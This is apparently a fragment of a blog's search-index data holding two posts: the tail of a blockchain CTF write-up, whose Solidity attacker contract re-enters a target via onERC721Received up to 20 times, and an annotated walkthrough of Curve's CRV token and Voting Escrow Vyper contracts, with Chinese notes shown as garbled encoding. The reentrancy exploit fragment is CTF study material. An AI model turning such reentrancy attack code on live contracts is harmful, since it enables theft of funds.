ERC721Received(operator,from,tokenId,data);\n        if (n>=20)&#123;\n            return this.onERC721Received.selector;\n        &#125;else&#123;\n            n++;\n            cont.theHope();\n            return this.onERC721Received.selector;\n        &#125;\n    &#125;\n    function myName() public view virtual returns (string memory)&#123;\n        return \"MyToken721UUPSV1_Holder\";\n    &#125;\n\n    function attack() public payable&#123;\n            cont.theHope();\n    &#125;\n&#125;\n\n","slug":"The 2nd Trusted Chain","date":"2022-08-20T07:50:42.857Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"1146d1d2628e1e9294dd0b11fc71e317","title":"Analysis of Curve","content":"\n\n\n\nFlow chart\nCurve TokenCode\nClick to see more\n# @version 0.2.4\n\"\"\"\n@title Curve DAO Token\n@author Curve Finance\n@license MIT\n@notice ERC20 with piecewise-linear mining supply.\n@dev Based on the ERC-20 token standard as defined at\n     https://eips.ethereum.org/EIPS/eip-20\n\"\"\"\n\nfrom vyper.interfaces import ERC20\n\nimplements: ERC20\n\n\nevent Transfer:\n    _from: indexed(address)\n    _to: indexed(address)\n    _value: uint256\n\nevent Approval:\n    _owner: indexed(address)\n    _spender: indexed(address)\n    _value: uint256\n\nevent UpdateMiningParameters:\n    time: uint256\n    rate: uint256\n    supply: uint256\n\nevent SetMinter:\n    minter: address\n\nevent SetAdmin:\n    admin: address\n\n\nname: public(String[64])\nsymbol: public(String[32])\ndecimals: public(uint256)\n\nbalanceOf: public(HashMap[address, uint256])\nallowances: HashMap[address, HashMap[address, uint256]]\ntotal_supply: uint256\n\nminter: public(address)\nadmin: public(address)\n\n# General constants\nYEAR: constant(uint256) = 86400 * 365\n\n# Allocation:\n# =========\n# * shareholders - 30%\n# * emplyees - 3%\n# * DAO-controlled reserve - 5%\n# * Early users - 5%\n# == 43% ==\n# left for inflation: 57%\n\n# Supply parameters\nINITIAL_SUPPLY: constant(uint256) = 1_303_030_303\nINITIAL_RATE: constant(uint256) = 274_815_283 * 10 ** 18 / YEAR  # leading to 43% premine\nRATE_REDUCTION_TIME: constant(uint256) = YEAR\nRATE_REDUCTION_COEFFICIENT: constant(uint256) = 1189207115002721024  # 2 ** (1/4) * 1e18\nRATE_DENOMINATOR: constant(uint256) = 10 ** 18\nINFLATION_DELAY: constant(uint256) = 86400\n\n# Supply variables\nmining_epoch: public(int128)\nstart_epoch_time: public(uint256)\nrate: public(uint256)\n\nstart_epoch_supply: uint256\n\n\n@external\ndef __init__(_name: String[64], _symbol: String[32], _decimals: uint256):\n    \"\"\"\n    @notice Contract constructor\n    @param _name Token full name\n    @param _symbol Token symbol\n    @param _decimals Number of decimals for token\n    \"\"\"\n    init_supply: uint256 = INITIAL_SUPPLY * 10 ** _decimals\n    self.name = _name\n    self.symbol = _symbol\n    self.decimals = _decimals\n    self.balanceOf[msg.sender] = init_supply\n    self.total_supply = init_supply\n    self.admin = msg.sender\n    log Transfer(ZERO_ADDRESS, msg.sender, init_supply)\n\n    self.start_epoch_time = block.timestamp + INFLATION_DELAY - RATE_REDUCTION_TIME\n    self.mining_epoch = -1\n    self.rate = 0\n    self.start_epoch_supply = init_supply\n\n\n@internal\ndef _update_mining_parameters():\n    \"\"\"\n    @dev Update mining rate and supply at the start of the epoch\n         Any modifying mining call must also call this\n    \"\"\"\n    _rate: uint256 = self.rate\n    _start_epoch_supply: uint256 = self.start_epoch_supply\n\n    self.start_epoch_time += RATE_REDUCTION_TIME\n    self.mining_epoch += 1\n\n    if _rate == 0:\n        _rate = INITIAL_RATE\n    else:\n        _start_epoch_supply += _rate * RATE_REDUCTION_TIME\n        self.start_epoch_supply = _start_epoch_supply\n        _rate = _rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT\n\n    self.rate = _rate\n\n    log UpdateMiningParameters(block.timestamp, _rate, _start_epoch_supply)\n\n\n@external\ndef update_mining_parameters():\n    \"\"\"\n    @notice Update mining rate and supply at the start of the epoch\n    @dev Callable by any address, but only once per epoch\n         Total supply becomes slightly larger if this function is called late\n    \"\"\"\n    assert block.timestamp >= self.start_epoch_time + RATE_REDUCTION_TIME  # dev: too soon!\n    self._update_mining_parameters()\n\n\n@external\ndef start_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the current mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time\n    else:\n        return _start_epoch_time\n\n\n@external\ndef future_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the next mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the next epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time + RATE_REDUCTION_TIME\n    else:\n        return _start_epoch_time + RATE_REDUCTION_TIME\n\n\n@internal\n@view\ndef _available_supply() -> uint256:\n    return self.start_epoch_supply + (block.timestamp - self.start_epoch_time) * self.rate\n\n\n@external\n@view\ndef available_supply() -> uint256:\n    \"\"\"\n    @notice Current number of tokens in existence (claimed or unclaimed)\n    \"\"\"\n    return self._available_supply()\n\n\n@external\n@view\ndef mintable_in_timeframe(start: uint256, end: uint256) -> uint256:\n    \"\"\"\n    @notice How much supply is mintable from start timestamp till end timestamp\n    @param start Start of the time interval (timestamp)\n    @param end End of the time interval (timestamp)\n    @return Tokens mintable from `start` till `end`\n    \"\"\"\n    assert start &lt;= end  # dev: start > end\n    to_mint: uint256 = 0\n    current_epoch_time: uint256 = self.start_epoch_time\n    current_rate: uint256 = self.rate\n\n    # Special case if end is in future (not yet minted) epoch\n    if end > current_epoch_time + RATE_REDUCTION_TIME:\n        current_epoch_time += RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT\n\n    assert end &lt;= current_epoch_time + RATE_REDUCTION_TIME  # dev: too far in future\n\n    for i in range(999):  # Curve will not work in 1000 years. Darn!\n        if end >= current_epoch_time:\n            current_end: uint256 = end\n            if current_end > current_epoch_time + RATE_REDUCTION_TIME:\n                current_end = current_epoch_time + RATE_REDUCTION_TIME\n\n            current_start: uint256 = start\n            if current_start >= current_epoch_time + RATE_REDUCTION_TIME:\n                break  # We should never get here but what if...\n            elif current_start &lt; current_epoch_time:\n                current_start = current_epoch_time\n\n            to_mint += current_rate * (current_end - current_start)\n\n            if start >= current_epoch_time:\n                break\n\n        current_epoch_time -= RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_REDUCTION_COEFFICIENT / RATE_DENOMINATOR  # double-division with rounding made rate a bit less => good\n        assert current_rate &lt;= INITIAL_RATE  # This should never happen\n\n    return to_mint\n\n\n@external\ndef set_minter(_minter: address):\n    \"\"\"\n    @notice Set the minter address\n    @dev Only callable once, when minter has not yet been set\n    @param _minter Address of the minter\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    assert self.minter == ZERO_ADDRESS  # dev: can set the minter only once, at creation\n    self.minter = _minter\n    log SetMinter(_minter)\n\n\n@external\ndef set_admin(_admin: address):\n    \"\"\"\n    @notice Set the new admin.\n    @dev After all is set up, admin only can change the token name\n    @param _admin New admin address\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    self.admin = _admin\n    log SetAdmin(_admin)\n\n\n@external\n@view\ndef totalSupply() -> uint256:\n    \"\"\"\n    @notice Total number of tokens in existence.\n    \"\"\"\n    return self.total_supply\n\n\n@external\n@view\ndef allowance(_owner : address, _spender : address) -> uint256:\n    \"\"\"\n    @notice Check the amount of tokens that an owner allowed to a spender\n    @param _owner The address which owns the funds\n    @param _spender The address which will spend the funds\n    @return uint256 specifying the amount of tokens still available for the spender\n    \"\"\"\n    return self.allowances[_owner][_spender]\n\n\n@external\ndef transfer(_to : address, _value : uint256) -> bool:\n    \"\"\"\n    @notice Transfer `_value` tokens from `msg.sender` to `_to`\n    @dev Vyper does not allow underflows, so the subtraction in\n         this function will revert on an insufficient balance\n    @param _to The address to transfer to\n    @param _value The amount to be transferred\n    @return bool success\n    \"\"\"\n    assert _to != ZERO_ADDRESS  # dev: transfers to 0x0 are not allowed\n    self.balanceOf[msg.sender] -= _value\n    self.balanceOf[_to] += _value\n    log Transfer(msg.sender, _to, _value)\n    return True\n\n\n@external\ndef transferFrom(_from : address, _to : address, _value : uint256) -> bool:\n    \"\"\"\n     @notice Transfer `_value` tokens from `_from` to `_to`\n     @param _from address The address which you want to send tokens from\n     @param _to address The address which you want to transfer to\n     @param _value uint256 the amount of tokens to be transferred\n     @return bool success\n    \"\"\"\n    assert _to != ZERO_ADDRESS  # dev: transfers to 0x0 are not allowed\n    # NOTE: vyper does not allow underflows\n    #       so the following subtraction would revert on insufficient balance\n    self.balanceOf[_from] -= _value\n    self.balanceOf[_to] += _value\n    self.allowances[_from][msg.sender] -= _value\n    log Transfer(_from, _to, _value)\n    return True\n\n\n@external\ndef approve(_spender : address, _value : uint256) -> bool:\n    \"\"\"\n    @notice Approve `_spender` to transfer `_value` tokens on behalf of `msg.sender`\n    @dev Approval may only be from zero -> nonzero or from nonzero -> zero in order\n        to mitigate the potential race condition described here:\n        https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    @param _spender The address which will spend the funds\n    @param _value The amount of tokens to be spent\n    @return bool success\n    \"\"\"\n    assert _value == 0 or self.allowances[msg.sender][_spender] == 0\n    self.allowances[msg.sender][_spender] = _value\n    log Approval(msg.sender, _spender, _value)\n    return True\n\n\n@external\ndef mint(_to: address, _value: uint256) -> bool:\n    \"\"\"\n    @notice Mint `_value` tokens and assign them to `_to`\n    @dev Emits a Transfer event originating from 0x00\n    @param _to The account that will receive the created tokens\n    @param _value The amount that will be created\n    @return bool success\n    \"\"\"\n    assert msg.sender == self.minter  # dev: minter only\n    assert _to != ZERO_ADDRESS  # dev: zero address\n\n    if block.timestamp >= self.start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n\n    _total_supply: uint256 = self.total_supply + _value\n    assert _total_supply &lt;= self._available_supply()  # dev: exceeds allowable mint amount\n    self.total_supply = _total_supply\n\n    self.balanceOf[_to] += _value\n    log Transfer(ZERO_ADDRESS, _to, _value)\n\n    return True\n\n\n@external\ndef burn(_value: uint256) -> bool:\n    \"\"\"\n    @notice Burn `_value` tokens belonging to `msg.sender`\n    @dev Emits a Transfer event with a destination of 0x00\n    @param _value The amount that will be burned\n    @return bool success\n    \"\"\"\n    self.balanceOf[msg.sender] -= _value\n    self.total_supply -= _value\n\n    log Transfer(msg.sender, ZERO_ADDRESS, _value)\n    return True\n\n\n@external\ndef set_name(_name: String[64], _symbol: String[32]):\n    \"\"\"\n    @notice Change the token name and symbol to `_name` and `_symbol`\n    @dev Only callable by the admin account\n    @param _name New token name\n    @param _symbol New token symbol\n    \"\"\"\n    assert msg.sender == self.admin, \"Only admin is allowed to change name\"\n    self.name = _name\n    self.symbol = _symbol\n\n\n\nAnalyze\nThe total supply of 3.03b is distributed as such:\n\n62% to community liquidity providers\n30% to shareholders (team and investors) with 2-4 years vesting\n3% to employees with 2 years vesting\n5% to the community reserve\n\nThe initial supply of around 1.3b (~43%) is distributed as such:\n\n5% to pre-CRV liquidity providers with 1 year vesting\n30% to shareholders (team and investors) with 2-4 years vesting\n3% to employees with 2 years vesting\n5% to the community reserve\n\n@external\ndef start_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the current mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time\n    else:\n        return _start_epoch_time\n\n\n@external\ndef future_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the next mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the next epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time + RATE_REDUCTION_TIME\n    else:\n        return _start_epoch_time + RATE_REDUCTION_TIME\n\nä¸¤ä¸ªå‡½æ•°åˆ†åˆ«èŽ·å–å½“å‰å’Œä¸‹ä¸€ä¸ªæŒ–æŽ˜é˜¶æ®µå¼€å§‹çš„æ—¶é—´æˆ³ï¼Œå¹¶åŒæ—¶è°ƒç”¨_update_mining_parameterså‡½æ•°æ›´æ–°å‚æ•°\ndef _available_supply() -> uint256:\n    return self.start_epoch_supply + (block.timestamp - self.start_epoch_time) * self.rate\n\n\n@external\n@view\ndef available_supply() -> uint256:\n    \"\"\"\n    @notice Current number of tokens in existence (claimed or unclaimed)\n    \"\"\"\n    return self._available_supply()\n\n\nèŽ·å¾—å…¨éƒ¨çš„tokenï¼ŒåŒ…æ‹¬è®¤é¢†ä»¥åŠæœªè®¤é¢†çš„å…¨éƒ¨\ndef mintable_in_timeframe(start: uint256, end: uint256) -> uint256:\n    \"\"\"\n    @notice How much supply is mintable from start timestamp till end timestamp\n    @param start Start of the time interval (timestamp)\n    @param end End of the time interval (timestamp)\n    @return Tokens mintable from `start` till `end`\n    \"\"\"\n    assert start &lt;= end  # dev: start > end\n    to_mint: uint256 = 0\n    current_epoch_time: uint256 = self.start_epoch_time\n    current_rate: uint256 = self.rate\n\n    # Special case if end is in future (not yet minted) epoch\n    if end > current_epoch_time + RATE_REDUCTION_TIME:\n        current_epoch_time += RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT\n\n    assert end &lt;= current_epoch_time + RATE_REDUCTION_TIME  # dev: too far in future\n\n    for i in range(999):  # Curve will not work in 1000 years. Darn!\n        if end >= current_epoch_time:\n            current_end: uint256 = end\n            if current_end > current_epoch_time + RATE_REDUCTION_TIME:\n                current_end = current_epoch_time + RATE_REDUCTION_TIME\n\n            current_start: uint256 = start\n            if current_start >= current_epoch_time + RATE_REDUCTION_TIME:\n                break  # We should never get here but what if...\n            elif current_start &lt; current_epoch_time:\n                current_start = current_epoch_time\n\n            to_mint += current_rate * (current_end - current_start)\n\n            if start >= current_epoch_time:\n                break\n\n        current_epoch_time -= RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_REDUCTION_COEFFICIENT / RATE_DENOMINATOR  # double-division with rounding made rate a bit less => good\n        assert current_rate &lt;= INITIAL_RATE  # This should never happen\n\n    return to_mint\n\nä»¥ä¸Šå‡½æ•°è®¡ç®—ä»Žå¼€å§‹æ—¶é—´åˆ°ç»“æŸæ—¶é—´çš„ä¾›åº”é‡\ncase 1\n\nend&gt; current_epoch_time(will update) + RATE_REDUCTION_TIME\nstart&lt;&#x3D;current_epoch_time(updated)â€”â€”&gt;return current_rate * (period)\nif start1 equal to updated start1(in case 1)ï¼Œthe same result\n\n\n\n\ncase 2\n\ncurrent_epoch_time&lt;end&lt;&#x3D;current_epoch_time(will update) + RATE_REDUCTION_TIME\n\nstart&lt;&#x3D;current_epoch_time(updated)â€”â€”&gt;return current_rate * (period)\n\nif start1 equal to updated start1(in case 1)ï¼Œthe same result\n\n\n  \ncase 3\n\nend&lt; current_epoch_time\nstart&lt;&#x3D;current_epoch_time(updated)â€”â€”&gt;return current_rate * (period)\nif star1 equal to updated start1(in case 1)ï¼Œthe same result\n\n\n\n\ncase 4\n\nend*n&lt;current_epoch_time\nfor å¾ªçŽ¯ï¼Œé€»è¾‘ç›¸åŒ\n\n\n\nVoting EscrowCode\nClick to see more\n# @version 0.2.4\n\"\"\"\n@title Voting Escrow\n@author Curve Finance\n@license MIT\n@notice Votes have a weight depending on time, so that users are\n        committed to the future of (whatever they are voting for)\n@dev Vote weight decays linearly over time. Lock time cannot be\n     more than `MAXTIME` (4 years).\n\"\"\"\n\n# Voting escrow to have time-weighted votes\n# Votes have a weight depending on time, so that users are committed\n# to the future of (whatever they are voting for).\n# The weight in this implementation is linear, and lock cannot be more than maxtime:\n# w ^\n# 1 +        /\n#   |      /\n#   |    /\n#   |  /\n#   |/\n# 0 +--------+------> time\n#       maxtime (4 years?)\n\nstruct Point:\n    bias: int128\n    slope: int128  # - dweight / dt\n    ts: uint256\n    blk: uint256  # block\n# We cannot really do block numbers per se b/c slope is per time, not per block\n# and per block could be fairly bad b/c Ethereum changes blocktimes.\n# What we can do is to extrapolate ***At functions\n\nstruct LockedBalance:\n    amount: int128\n    end: uint256\n\n\ninterface ERC20:\n    def decimals() -> uint256: view\n    def name() -> String[64]: view\n    def symbol() -> String[32]: view\n    def transfer(to: address, amount: uint256) -> bool: nonpayable\n    def transferFrom(spender: address, to: address, amount: uint256) -> bool: nonpayable\n\n\n# Interface for checking whether address belongs to a whitelisted\n# type of a smart wallet.\n# When new types are added - the whole contract is changed\n# The check() method is modifying to be able to use caching\n# for individual wallet addresses\ninterface SmartWalletChecker:\n    def check(addr: address) -> bool: nonpayable\n\nDEPOSIT_FOR_TYPE: constant(int128) = 0\nCREATE_LOCK_TYPE: constant(int128) = 1\nINCREASE_LOCK_AMOUNT: constant(int128) = 2\nINCREASE_UNLOCK_TIME: constant(int128) = 3\n\n\nevent CommitOwnership:\n    admin: address\nevent ApplyOwnership:\n    admin: address\nevent Deposit:\n    provider: indexed(address)\n    value: uint256\n    locktime: indexed(uint256)\n    type: int128\n    ts: uint256\nevent Withdraw:\n    provider: indexed(address)\n    value: uint256\n    ts: uint256\nevent Supply:\n    prevSupply: uint256\n    supply: uint256\n\n\nWEEK: constant(uint256) = 7 * 86400  # all future times are rounded by week\nMAXTIME: constant(uint256) = 4 * 365 * 86400  # 4 years\nMULTIPLIER: constant(uint256) = 10 ** 18\n\ntoken: public(address)\nsupply: public(uint256)\n\nlocked: public(HashMap[address, LockedBalance])\n\nepoch: public(uint256)\npoint_history: public(Point[100000000000000000000000000000])  # epoch -> unsigned point\nuser_point_history: public(HashMap[address, Point[1000000000]])  # user -> Point[user_epoch]\nuser_point_epoch: public(HashMap[address, uint256])\nslope_changes: public(HashMap[uint256, int128])  # time -> signed slope change\n\n# Aragon's view methods for compatibility\ncontroller: public(address)\ntransfersEnabled: public(bool)\n\nname: public(String[64])\nsymbol: public(String[32])\nversion: public(String[32])\ndecimals: public(uint256)\n\n# Checker for whitelisted (smart contract) wallets which are allowed to deposit\n# The goal is to prevent tokenizing the escrow\nfuture_smart_wallet_checker: public(address)\nsmart_wallet_checker: public(address)\n\nadmin: public(address)  # Can and will be a smart contract\nfuture_admin: public(address)\n\n\n@external\ndef __init__(token_addr: address, _name: String[64], _symbol: String[32], _version: String[32]):\n    \"\"\"\n    @notice Contract constructor\n    @param token_addr `ERC20CRV` token address\n    @param _name Token name\n    @param _symbol Token symbol\n    @param _version Contract version - required for Aragon compatibility\n    \"\"\"\n    self.admin = msg.sender\n    self.token = token_addr\n    self.point_history[0].blk = block.number\n    self.point_history[0].ts = block.timestamp\n    self.controller = msg.sender\n    self.transfersEnabled = True\n\n    _decimals: uint256 = ERC20(token_addr).decimals()\n    assert _decimals &lt;= 255\n    self.decimals = _decimals\n\n    self.name = _name\n    self.symbol = _symbol\n    self.version = _version\n\n\n@external\ndef commit_transfer_ownership(addr: address):\n    \"\"\"\n    @notice Transfer ownership of VotingEscrow contract to `addr`\n    @param addr Address to have ownership transferred to\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    self.future_admin = addr\n    log CommitOwnership(addr)\n\n\n@external\ndef apply_transfer_ownership():\n    \"\"\"\n    @notice Apply ownership transfer\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    _admin: address = self.future_admin\n    assert _admin != ZERO_ADDRESS  # dev: admin not set\n    self.admin = _admin\n    log ApplyOwnership(_admin)\n\n\n@external\ndef commit_smart_wallet_checker(addr: address):\n    \"\"\"\n    @notice Set an external contract to check for approved smart contract wallets\n    @param addr Address of Smart contract checker\n    \"\"\"\n    assert msg.sender == self.admin\n    self.future_smart_wallet_checker = addr\n\n\n@external\ndef apply_smart_wallet_checker():\n    \"\"\"\n    @notice Apply setting external contract to check approved smart contract wallets\n    \"\"\"\n    assert msg.sender == self.admin\n    self.smart_wallet_checker = self.future_smart_wallet_checker\n\n\n@internal\ndef assert_not_contract(addr: address):\n    \"\"\"\n    @notice Check if the call is from a whitelisted smart contract, revert if not\n    @param addr Address to be checked\n    \"\"\"\n    if addr != tx.origin:\n        checker: address = self.smart_wallet_checker\n        if checker != ZERO_ADDRESS:\n            if SmartWalletChecker(checker).check(addr):\n                return\n        raise \"Smart contract depositors not allowed\"\n\n\n@external\n@view\ndef get_last_user_slope(addr: address) -> int128:\n    \"\"\"\n    @notice Get the most recently recorded rate of voting power decrease for `addr`\n    @param addr Address of the user wallet\n    @return Value of the slope\n    \"\"\"\n    uepoch: uint256 = self.user_point_epoch[addr]\n    return self.user_point_history[addr][uepoch].slope\n\n\n@external\n@view\ndef user_point_history__ts(_addr: address, _idx: uint256) -> uint256:\n    \"\"\"\n    @notice Get the timestamp for checkpoint `_idx` for `_addr`\n    @param _addr User wallet address\n    @param _idx User epoch number\n    @return Epoch time of the checkpoint\n    \"\"\"\n    return self.user_point_history[_addr][_idx].ts\n\n\n@external\n@view\ndef locked__end(_addr: address) -> uint256:\n    \"\"\"\n    @notice Get timestamp when `_addr`'s lock finishes\n    @param _addr User wallet\n    @return Epoch time of the lock end\n    \"\"\"\n    return self.locked[_addr].end\n\n\n@internal\ndef _checkpoint(addr: address, old_locked: LockedBalance, new_locked: LockedBalance):\n    \"\"\"\n    @notice Record global and per-user data to checkpoint\n    @param addr User's wallet address. No user checkpoint if 0x0\n    @param old_locked Pevious locked amount / end lock time for the user\n    @param new_locked New locked amount / end lock time for the user\n    \"\"\"\n    u_old: Point = empty(Point)\n    u_new: Point = empty(Point)\n    old_dslope: int128 = 0\n    new_dslope: int128 = 0\n    _epoch: uint256 = self.epoch\n\n    if addr != ZERO_ADDRESS:\n        # Calculate slopes and biases\n        # Kept at zero when they have to\n        if old_locked.end > block.timestamp and old_locked.amount > 0:\n            u_old.slope = old_locked.amount / MAXTIME\n            u_old.bias = u_old.slope * convert(old_locked.end - block.timestamp, int128)\n        if new_locked.end > block.timestamp and new_locked.amount > 0:\n            u_new.slope = new_locked.amount / MAXTIME\n            u_new.bias = u_new.slope * convert(new_locked.end - block.timestamp, int128)\n\n        # Read values of scheduled changes in the slope\n        # old_locked.end can be in the past and in the future\n        # new_locked.end can ONLY by in the FUTURE unless everything expired: than zeros\n        old_dslope = self.slope_changes[old_locked.end]\n        if new_locked.end != 0:\n            if new_locked.end == old_locked.end:\n                new_dslope = old_dslope\n            else:\n                new_dslope = self.slope_changes[new_locked.end]\n\n    last_point: Point = Point(&#123;bias: 0, slope: 0, ts: block.timestamp, blk: block.number&#125;)\n    if _epoch > 0:\n        last_point = self.point_history[_epoch]\n    last_checkpoint: uint256 = last_point.ts\n    # initial_last_point is used for extrapolation to calculate block number\n    # (approximately, for *At methods) and save them\n    # as we cannot figure that out exactly from inside the contract\n    initial_last_point: Point = last_point\n    block_slope: uint256 = 0  # dblock/dt\n    if block.timestamp > last_point.ts:\n        block_slope = MULTIPLIER * (block.number - last_point.blk) / (block.timestamp - last_point.ts)\n    # If last point is already recorded in this block, slope=0\n    # But that's ok b/c we know the block in such case\n\n    # Go over weeks to fill history and calculate what the current point is\n    t_i: uint256 = (last_checkpoint / WEEK) * WEEK\n    for i in range(255):\n        # Hopefully it won't happen that this won't get used in 5 years!\n        # If it does, users will be able to withdraw but vote weight will be broken\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > block.timestamp:\n            t_i = block.timestamp\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_checkpoint, int128)\n        last_point.slope += d_slope\n        if last_point.bias &lt; 0:  # This can happen\n            last_point.bias = 0\n        if last_point.slope &lt; 0:  # This cannot happen - just in case\n            last_point.slope = 0\n        last_checkpoint = t_i\n        last_point.ts = t_i\n        last_point.blk = initial_last_point.blk + block_slope * (t_i - initial_last_point.ts) / MULTIPLIER\n        _epoch += 1\n        if t_i == block.timestamp:\n            last_point.blk = block.number\n            break\n        else:\n            self.point_history[_epoch] = last_point\n\n    self.epoch = _epoch\n    # Now point_history is filled until t=now\n\n    if addr != ZERO_ADDRESS:\n        # If last point was in this block, the slope change has been applied already\n        # But in such case we have 0 slope(s)\n        last_point.slope += (u_new.slope - u_old.slope)\n        last_point.bias += (u_new.bias - u_old.bias)\n        if last_point.slope &lt; 0:\n            last_point.slope = 0\n        if last_point.bias &lt; 0:\n            last_point.bias = 0\n\n    # Record the changed point into history\n    self.point_history[_epoch] = last_point\n\n    if addr != ZERO_ADDRESS:\n        # Schedule the slope changes (slope is going down)\n        # We subtract new_user_slope from [new_locked.end]\n        # and add old_user_slope to [old_locked.end]\n        if old_locked.end > block.timestamp:\n            # old_dslope was &lt;something> - u_old.slope, so we cancel that\n            old_dslope += u_old.slope\n            if new_locked.end == old_locked.end:\n                old_dslope -= u_new.slope  # It was a new deposit, not extension\n            self.slope_changes[old_locked.end] = old_dslope\n\n        if new_locked.end > block.timestamp:\n            if new_locked.end > old_locked.end:\n                new_dslope -= u_new.slope  # old slope disappeared at this point\n                self.slope_changes[new_locked.end] = new_dslope\n            # else: we recorded it already in old_dslope\n\n        # Now handle user history\n        user_epoch: uint256 = self.user_point_epoch[addr] + 1\n\n        self.user_point_epoch[addr] = user_epoch\n        u_new.ts = block.timestamp\n        u_new.blk = block.number\n        self.user_point_history[addr][user_epoch] = u_new\n\n\n@internal\ndef _deposit_for(_addr: address, _value: uint256, unlock_time: uint256, locked_balance: LockedBalance, type: int128):\n    \"\"\"\n    @notice Deposit and lock tokens for a user\n    @param _addr User's wallet address\n    @param _value Amount to deposit\n    @param unlock_time New time when to unlock the tokens, or 0 if unchanged\n    @param locked_balance Previous locked amount / timestamp\n    \"\"\"\n    _locked: LockedBalance = locked_balance\n    supply_before: uint256 = self.supply\n\n    self.supply = supply_before + _value\n    old_locked: LockedBalance = _locked\n    # Adding to existing lock, or if a lock is expired - creating a new one\n    _locked.amount += convert(_value, int128)\n    if unlock_time != 0:\n        _locked.end = unlock_time\n    self.locked[_addr] = _locked\n\n    # Possibilities:\n    # Both old_locked.end could be current or expired (>/&lt; block.timestamp)\n    # value == 0 (extend lock) or value > 0 (add to lock or extend lock)\n    # _locked.end > block.timestamp (always)\n    self._checkpoint(_addr, old_locked, _locked)\n\n    if _value != 0:\n        assert ERC20(self.token).transferFrom(_addr, self, _value)\n\n    log Deposit(_addr, _value, _locked.end, type, block.timestamp)\n    log Supply(supply_before, supply_before + _value)\n\n\n@external\ndef checkpoint():\n    \"\"\"\n    @notice Record global data to checkpoint\n    \"\"\"\n    self._checkpoint(ZERO_ADDRESS, empty(LockedBalance), empty(LockedBalance))\n\n\n@external\n@nonreentrant('lock')\ndef deposit_for(_addr: address, _value: uint256):\n    \"\"\"\n    @notice Deposit `_value` tokens for `_addr` and add to the lock\n    @dev Anyone (even a smart contract) can deposit for someone else, but\n         cannot extend their locktime and deposit for a brand new user\n    @param _addr User's wallet address\n    @param _value Amount to add to user's lock\n    \"\"\"\n    _locked: LockedBalance = self.locked[_addr]\n\n    assert _value > 0  # dev: need non-zero value\n    assert _locked.amount > 0, \"No existing lock found\"\n    assert _locked.end > block.timestamp, \"Cannot add to expired lock. Withdraw\"\n\n    self._deposit_for(_addr, _value, 0, self.locked[_addr], DEPOSIT_FOR_TYPE)\n\n\n@external\n@nonreentrant('lock')\ndef create_lock(_value: uint256, _unlock_time: uint256):\n    \"\"\"\n    @notice Deposit `_value` tokens for `msg.sender` and lock until `_unlock_time`\n    @param _value Amount to deposit\n    @param _unlock_time Epoch time when tokens unlock, rounded down to whole weeks\n    \"\"\"\n    self.assert_not_contract(msg.sender)\n    unlock_time: uint256 = (_unlock_time / WEEK) * WEEK  # Locktime is rounded down to weeks\n    _locked: LockedBalance = self.locked[msg.sender]\n\n    assert _value > 0  # dev: need non-zero value\n    assert _locked.amount == 0, \"Withdraw old tokens first\"\n    assert unlock_time > block.timestamp, \"Can only lock until time in the future\"\n    assert unlock_time &lt;= block.timestamp + MAXTIME, \"Voting lock can be 4 years max\"\n\n    self._deposit_for(msg.sender, _value, unlock_time, _locked, CREATE_LOCK_TYPE)\n\n\n@external\n@nonreentrant('lock')\ndef increase_amount(_value: uint256):\n    \"\"\"\n    @notice Deposit `_value` additional tokens for `msg.sender`\n            without modifying the unlock time\n    @param _value Amount of tokens to deposit and add to the lock\n    \"\"\"\n    self.assert_not_contract(msg.sender)\n    _locked: LockedBalance = self.locked[msg.sender]\n\n    assert _value > 0  # dev: need non-zero value\n    assert _locked.amount > 0, \"No existing lock found\"\n    assert _locked.end > block.timestamp, \"Cannot add to expired lock. Withdraw\"\n\n    self._deposit_for(msg.sender, _value, 0, _locked, INCREASE_LOCK_AMOUNT)\n\n\n@external\n@nonreentrant('lock')\ndef increase_unlock_time(_unlock_time: uint256):\n    \"\"\"\n    @notice Extend the unlock time for `msg.sender` to `_unlock_time`\n    @param _unlock_time New epoch time for unlocking\n    \"\"\"\n    self.assert_not_contract(msg.sender)\n    _locked: LockedBalance = self.locked[msg.sender]\n    unlock_time: uint256 = (_unlock_time / WEEK) * WEEK  # Locktime is rounded down to weeks\n\n    assert _locked.end > block.timestamp, \"Lock expired\"\n    assert _locked.amount > 0, \"Nothing is locked\"\n    assert unlock_time > _locked.end, \"Can only increase lock duration\"\n    assert unlock_time &lt;= block.timestamp + 